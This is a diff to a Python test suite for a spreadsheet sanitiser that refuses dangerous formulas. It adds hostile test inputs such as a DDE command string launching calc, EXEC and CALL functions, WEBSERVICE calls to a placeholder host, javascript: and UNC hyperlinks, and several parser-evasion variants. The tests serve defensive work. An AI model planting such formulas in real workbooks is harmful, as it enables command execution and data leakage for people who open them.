@@ -36,11 +36,19 @@ class FunctionAllowlistTests(SimpleTestCase):
             '_xlfn.IMPORTCSV("http://x.invalid/a.csv")': 'IMPORTCSV', '_xlfn.IMPORTTEXT("a")': 'IMPORTTEXT',
             '_xlfn.TRANSLATE(A1,"en","fr")': 'TRANSLATE', '_xlfn.COPILOT("x",A1)': 'COPILOT',
             'CUBEVALUE("m","[x]")': 'CUBEVALUE', 'SQL.REQUEST("DSN=x",,,"select 1")': 'SQL.REQUEST',
-            '_xludf.SOMEFN(A1)': '_xludf.SOMEFN', '_xlfn.WEBSERVICE ("http://x.invalid")': 'WEBSERVICE',
+            '_xlfn.WEBSERVICE ("http://x.invalid")': 'WEBSERVICE',
             '_xlfn.FILTERXML("<a/>","//a")': 'FILTERXML', 'RTD("p",,"x")': 'RTD', 'CALL("k","x","J")': 'CALL',
             'REGISTER.ID("a","b")': 'REGISTER.ID', 'EXEC("x")': 'EXEC', "cmd|'/c calc'!A0": 'DDE',
-            'HYPERLINK("https://ok.invalid/"&A1)': 'HYPERLINK', 'HYPERLINK(A1)': 'HYPERLINK',
-            'HYPERLINK("file:///c:/x")': 'HYPERLINK',
+            'HYPERLINK("file:///c:/x")': 'HYPERLINK', 'HYPERLINK("\\\\\\\\host\\\\s"&A1)': 'HYPERLINK',
+            'HYPERLINK("javascript:x")': 'HYPERLINK',
+            # Round 3: escapes in a structured reference, a bracket left open, names never called, a LAMBDA's
+            # parameter called, a no-break space, lower case, a dotted capital I
+            "T1[a'[]+_xlfn.WEBSERVICE(\"http://x.invalid/\")+T1[c']]": 'WEBSERVICE',
+            '[+_xlfn.WEBSERVICE("http://x.invalid/")': 'WEBSERVICE', '_xlfn.MAP(A1:A2,WEBSERVICE)': 'WEBSERVICE',
+            '_xlfn.MAP(A1:A2,_xlfn.WEBSERVICE)': 'WEBSERVICE', '_xlfn.MAP(A1:A2,_xlfn._xleta.WEBSERVICE)': 'WEBSERVICE',
+            '_xlfn.LET(_xlpm.x,1,_xlpm.WEBSERVICE("http://x.invalid/"))': 'WEBSERVICE',
+            '_xlfn.WEBSERVICE\u00a0("http://x.invalid/")': 'WEBSERVICE', '_xlfn.webservice("x")': 'webservice',
+            '_xlfn.WEBSERV\u0130CE("x")': 'WEBSERV', 'GET.CELL(1,A1)': 'GET.CELL', '_xludf.WEBSERVICE(1)': 'WEBSERVICE',
         }
         for formula, name in cases.items():
             with self.subTest(formula):
@@ -49,12 +57,28 @@ class FunctionAllowlistTests(SimpleTestCase):
                 self.assertIn('Sheet Sheet cell B1', str(e))
 
     def test_never_wins_over_the_list(self):
+        with mock.patch.object(ooxml, 'FUNCTIONS', ooxml.FUNCTIONS | {'WEBSERVICE', 'IMAGE'}):
+            refused(self, with_formula('_xlfn.WEBSERVICE("http://x.invalid")'), 'fetch')
+
+    def test_nothing_is_remembered_between_uploads_and_little_within_one(self):
+        import tracemalloc
+        self.assertIsNone(ooxml._context.get())
+        tracemalloc.start()
+        for i in range(3000):
+            ooxml.formula_problem('"\U0001F600' + ('%06d' % i) * 1300 + '"')
+        current, _ = tracemalloc.get_traced_memory()
+        tracemalloc.stop()
+        self.assertLess(current, 2 * 1024 * 1024)  # 3,000 distinct 8 KB formulas: none of them kept
+        cache = {}
+        token = ooxml._context.set((cache, frozenset(), True))
         try:
-            with mock.patch.object(ooxml, 'FUNCTIONS', ooxml.FUNCTIONS | {'WEBSERVICE', 'IMAGE'}):
-                ooxml.formula_problem.cache_clear()
-                refused(self, with_formula('_xlfn.WEBSERVICE("http://x.invalid")'), 'fetch')
+            for i in range(ooxml.CACHE_ENTRIES + 500):
+                ooxml.formula_problem(f'SUM({i})')
+            ooxml.formula_problem('SUM(' + '1,' * 600 + '1)')
         finally:
-            ooxml.formula_problem.cache_clear()
+            ooxml._context.reset(token)
+        self.assertEqual(len(cache), ooxml.CACHE_ENTRIES)
+        self.assertTrue(all(len(k) < ooxml.CACHE_TEXT for k in cache))
 
     def test_modern_and_everyday_functions_pass(self):
         for formula in ('_xlfn.XLOOKUP(A1,A2:A5,B2:B5)', '_xlfn._xlws.FILTER(A1:A5,B1:B5>0)',
@@ -65,7 +89,9 @@ class FunctionAllowlistTests(SimpleTestCase):
                         '_xlfn.MAP(A1:A2,_xleta.SUM)', 'SUM(_xlfn.ANCHORARRAY(C1))', '_xlfn.SINGLE(A1:A5)',
                         "IFERROR(INDEX('Sheet 2'!$F$7:$F$45,MATCH($B$2,'Sheet 2'!$D$7:$D$45,0)),0)",
                         'SUM(Table1[[#This Row],[Qty]])', 'HYPERLINK("https://example.com/spec","Spec")',
-                        'HYPERLINK("#Sheet!A1")', '"a|b"&"WEBSERVICE("', 'IF(ISNUMBER(D4),D4*(F4+G4),"")'):
+                        'HYPERLINK("#Sheet!A1")', '"a|b"&"WEBSERVICE("', 'IF(ISNUMBER(D4),D4*(F4+G4),"")',
+                        'HYPERLINK(A1)', 'HYPERLINK("https://ok.invalid/"&A1)', 'HYPERLINK(A1&"x","t")',
+                        "SUM(Table1[[#Headers],[Rate'[GBP']]])", '_xlnm._FilterDatabase'):
             with self.subTest(formula):
                 ooxml.clean(with_formula(formula))
 
@@ -86,6 +112,32 @@ class FunctionAllowlistTests(SimpleTestCase):
         self.assertNotIn(b'<f', out)
         self.assertIn(b'<v>y</v>', out)
 
+    def test_an_add_in_function_in_a_cell_is_taken_out_too(self):
+        clean, _, notes = ooxml.clean_report(with_formula('_xludf.SOMEFN(A1)', cached='7'))
+        self.assertNotIn(b'_xludf', files(clean)[S])
+        self.assertIn('_xludf.SOMEFN', notes[0])
+
+    def test_a_cell_repeating_a_shared_formula_before_its_master_is_refused(self):
+        def change(f):
+            f[S] = f[S].replace(b'</sheetData>', b'<row r="2"><c r="A2"><f t="shared" si="0"/><v>5</v></c></row>'
+                                b'<row r="3"><c r="A3"><f t="shared" ref="A2:A4" si="0">MYUDF(B3)</f><v>6</v></c>'
+                                b'</row></sheetData>')
+        refused(self, edited(change), 'layout')
+
+    def test_a_lambda_bound_to_a_defined_name_may_be_called(self):
+        def change(f):
+            f['xl/workbook.xml'] = f['xl/workbook.xml'].replace(
+                b'</sheets>', b'</sheets><definedNames><definedName name="AddVat">_xlfn.LAMBDA(_xlpm.x,_xlpm.x*1.2)'
+                b'</definedName><definedName name="Gross">AddVat(100)</definedName></definedNames>')
+            f[S] = f[S].replace(b'<f>1+1</f>', b'<f>AddVat(A1)</f>')
+        clean, _, notes = ooxml.clean_report(edited(change))
+        self.assertIn(b'AddVat(A1)', files(clean)[S])
+        self.assertEqual(notes, [])
+        bad = edited(lambda f: f.__setitem__('xl/workbook.xml', f['xl/workbook.xml'].replace(
+            b'</sheets>', b'</sheets><definedNames><definedName name="Fetch">_xlfn.LAMBDA(_xlpm.u,'
+            b'_xlfn.WEBSERVICE(_xlpm.u))</definedName></definedNames>')))
+        refused(self, bad, 'fetch')
+
     def test_elsewhere_an_unknown_function_is_refused(self):
         name = edited(lambda f: f.__setitem__('xl/workbook.xml', f['xl/workbook.xml'].replace(
             b'</sheets>', b'</sheets><definedNames><definedName name="X">NumberToPounds(1)</definedName>'
@@ -104,8 +156,8 @@ class FormulaCostTests(SimpleTestCase):
 
     def test_adversarial_formulas_are_linear(self):
         for text in ('a|' * 4000, '"' * 8191, "'" * 8191, '[' * 8000, 'SUM(' * 2000, 'A' * 8192, '""' * 4096,
-                     'x' + 'a' * 8000 + '(', '_xleta.' * 1000, 'A1' + ' ' * 8000 + '('):
-            ooxml.formula_problem.cache_clear()
+                     'x' + 'a' * 8000 + '(', '_xleta.' * 1000, 'A1' + ' ' * 8000 + '(', "[a'" * 2700,
+                     '_xlfn.' * 1300, '\u00a0' * 8000, 'A1+' * 2666):
             t = time.monotonic()
             ooxml.formula_problem(text[:8192])
             with self.subTest(text[:12]):
@@ -139,12 +191,19 @@ class FormulaCostTests(SimpleTestCase):
 class FormulaPlacesTests(SimpleTestCase):
     """N3: formulas in attributes, tables and pivot caches are checked too."""
 
-    def test_cfvo_formula(self):
-        data = edited(lambda f: f.__setitem__(S, f[S].replace(b'<pageMargins', (
-            b'<conditionalFormatting sqref="A1"><cfRule type="dataBar" priority="1"><dataBar><cfvo type="formula" '
-            b'val="_xlfn.WEBSERVICE(&quot;http://x.invalid&quot;)"/><cfvo type="max"/><color rgb="FF638EC6"/>'
-            b'</dataBar></cfRule></conditionalFormatting><pageMargins'))))
-        refused(self, data, 'fetch')
+    def test_cfvo_formula_whatever_its_type(self):
+        for kind in (b'formula', b'Formula', b'num', b'percent', b'percentile'):
+            data = edited(lambda f, kind=kind: f.__setitem__(S, f[S].replace(b'<pageMargins', (
+                b'<conditionalFormatting sqref="A1"><cfRule type="dataBar" priority="1"><dataBar><cfvo type="' + kind
+                + b'" val="_xlfn.WEBSERVICE(&quot;http://x.invalid&quot;)"/><cfvo type="max"/><color rgb="FF638EC6"/>'
+                b'</dataBar></cfRule></conditionalFormatting><pageMargins'))))
+            with self.subTest(kind):
+                refused(self, data, 'fetch')
+        plain = edited(lambda f: f.__setitem__(S, f[S].replace(b'<pageMargins', (
+            b'<conditionalFormatting sqref="A1"><cfRule type="dataBar" priority="1"><dataBar><cfvo type="num" '
+            b'val="-1.5E2"/><cfvo type="percent" val="90"/><color rgb="FF638EC6"/></dataBar></cfRule>'
+            b'</conditionalFormatting><pageMargins'))))
+        ooxml.clean(plain)
 
     def test_table_formulas(self):
         from openpyxl.worksheet.table import Table
@@ -162,12 +221,24 @@ class FormulaPlacesTests(SimpleTestCase):
                 self.assertIn('Table table1.xml', str(refused(self, edited(change, base(setup)), 'fetch')))
 
     def test_pivot_cache_field_formula(self):
+        self.pivot(b'<cacheFields count="1"><cacheField name="x" numFmtId="0" formula="_xlfn.WEBSERVICE(&quot;'
+                   b'http://x.invalid&quot;)"/></cacheFields>')
+
+    def test_pivot_calculated_items_and_members(self):
+        for body in (b'<cacheFields count="1"><cacheField name="x" numFmtId="0"/></cacheFields><calculatedItems '
+                     b'count="1"><calculatedItem formula="_xlfn.WEBSERVICE(&quot;http://x.invalid/&quot;)"><pivotArea/>'
+                     b'</calculatedItem></calculatedItems>',
+                     b'<cacheFields count="1"><cacheField name="x" numFmtId="0"/></cacheFields><calculatedMembers '
+                     b'count="1"><calculatedMember name="m" mdx="_xlfn.WEBSERVICE(&quot;http://x.invalid/&quot;)"/>'
+                     b'</calculatedMembers>'):
+            with self.subTest(body[60:100]):
+                self.pivot(body)
+
+    def pivot(self, body):
         def change(f):
             f['xl/pivotCache/pivotCacheDefinition1.xml'] = (
                 b'<pivotCacheDefinition xmlns="' + MAIN + b'" refreshOnLoad="1"><cacheSource type="worksheet">'
-                b'<worksheetSource ref="A1:B2" sheet="Sheet"/></cacheSource><cacheFields count="1"><cacheField '
-                b'name="x" numFmtId="0" formula="_xlfn.WEBSERVICE(&quot;http://x.invalid&quot;)"/></cacheFields>'
-                b'</pivotCacheDefinition>')
+                b'<worksheetSource ref="A1:B2" sheet="Sheet"/></cacheSource>' + body + b'</pivotCacheDefinition>')
             f['[Content_Types].xml'] = f['[Content_Types].xml'].replace(
                 b'</Types>', b'<Override PartName="/xl/pivotCache/pivotCacheDefinition1.xml" ContentType="application/'
                 b'vnd.openxmlformats-officedocument.spreadsheetml.pivotCacheDefinition+xml"/></Types>')
